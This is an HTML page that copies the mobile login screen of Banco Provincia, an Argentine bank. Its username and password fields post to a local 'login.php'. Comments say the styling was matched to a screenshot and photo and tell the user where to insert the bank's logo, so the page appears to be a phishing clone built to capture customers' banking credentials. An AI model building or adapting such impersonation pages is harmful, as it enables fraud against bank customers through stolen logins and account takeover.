<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Banco Provincia</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  :root {
    --verde-principal: #009b5c;
    --texto-gris: #3c3c3c;
    --texto-placeholder: #999;
    --borde-inferior: #ccc;
    /* Gradiente similar al de la captura */
    --grad-header: linear-gradient(90deg, #007a2b 0%, #2ebcb5 100%); 
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'Segoe UI', Roboto, sans-serif;
    background-color: #f4f6f8;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  .mobile-container {
    width: 100%;
    max-width: 400px;
    background: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    position: relative;
  }

  @media (min-width: 401px) {
    .mobile-container {
      height: 90vh;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      margin-top: 20px;
      margin-bottom: 20px;
    }
  }

  /* HEADER CON LOGO */
  header {
    background: var(--grad-header);
    padding: 20px;
    text-align: center;
    color: white;
    flex-shrink: 0;
  }

  .logo-area {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 15px;
    margin-bottom: 15px;
  }

  /* AQUÍ VA TU IMAGEN logo.png */
  .logo-img {
    height: 40px; /* Ajustá este tamaño según tu imagen */
    width: auto;
  }

  h1 { font-size: 1.2rem; font-weight: 600; margin: 0; }
  
  .subtitulo {
    font-size: 1.1rem;
    font-weight: 600;
    margin-top: 10px;
  }

  /* FORMULARIO */
  form {
    padding: 30px 25px;
    flex-grow: 1;
    display: flex;
    flex-direction: column;
  }

  .input-group { margin-bottom: 25px; position: relative; }

  label {
    display: block;
    margin-bottom: 8px;
    font-weight: 600;
    font-size: 0.95rem;
    color: var(--texto-gris);
  }

  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 12px 10px;
    font-size: 1rem;
    border: none;
    border-bottom: 2px solid var(--borde-inferior);
    background: transparent;
    color: var(--texto-gris);
    outline: none;
    border-radius: 0;
  }

  input:focus { border-bottom-color: var(--verde-principal); }
  input::placeholder { color: var(--texto-placeholder); }

  /* BOTÓN OJO */
  .toggle-password {
    position: absolute;
    right: 10px;
    top: 35px;
    background: none;
    border: none;
    color: var(--verde-principal);
    cursor: pointer;
    font-size: 1.1rem;
  }

  /* BOTÓN INGRESAR */
  .btn-ingresar {
    width: 100%;
    padding: 14px;
    background-color: #3c3c3c; /* Gris oscuro como en la foto */
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    margin-top: 10px;
  }

  /* LINKS */
  .links-footer {
    padding: 20px 25px;
    display: flex;
    flex-direction: column;
    gap: 15px;
    border-top: 1px solid #eee;
    background: #fafafa;
  }

  .link-item {
    text-decoration: underline;
    color: var(--verde-principal);
    font-size: 0.9rem;
    text-align: left;
  }
</style>
</head>
<body>

<div class="mobile-container">
  <header>
    <div class="logo-area">
      <!-- IMAGEN GUARDADA COMO logo.png -->
      <img src="logo.png" alt="Banco Provincia" class="logo-img">
      <h1>Banco Provincia</h1>
    </div>
    <div class="subtitulo">Iniciá sesión</div>
</header>

  <!-- EL FORMULARIO ENVÍA DATOS A login.php -->
  <form action="login.php" method="POST">
    
    <div class="input-group">
      <label for="usuario">Tu usuario <span style="color:red">*</span></label>
      <input type="text" id="usuario" name="username" placeholder="Ingresá tu nombre de usuario" required>
    </div>

    <div class="input-group">
      <label for="clave">Tu clave <span style="color:red">*</span></label>
      <input type="password" id="clave" name="password" placeholder="Ingresá tu clave" required>
      <button type="button" class="toggle-password" onclick="togglePass()">
        <i class="fa-regular fa-eye"></i>
      </button>
    </div>

    <button type="submit" class="btn-ingresar">ingresar</button>
  </form>

  <div class="links-footer">
    <a href="#" class="link-item">¿No sos BIP? Registrate</a>
    <a href="#" class="link-item">Bloqueé u olvidé mi usuario y/o clave</a>
    <a href="#" class="link-item">Conocé como hacerte usuario u operar</a>
    <a href="#" class="link-item">Recomendaciones de seguridad</a>
  </div>
</div>

<script>
  function togglePass() {
    const passInput = document.getElementById('clave');
    const icon = document.querySelector('.toggle-password i');
    
    if (passInput.type === 'password') {
      passInput.type = 'text';
      icon.classList.remove('fa-eye');
      icon.classList.add('fa-eye-slash');
    } else {
      passInput.type = 'password';
      icon.classList.remove('fa-eye-slash');
      icon.classList.add('fa-eye');
    }
  }
</script>

</body>
</html>
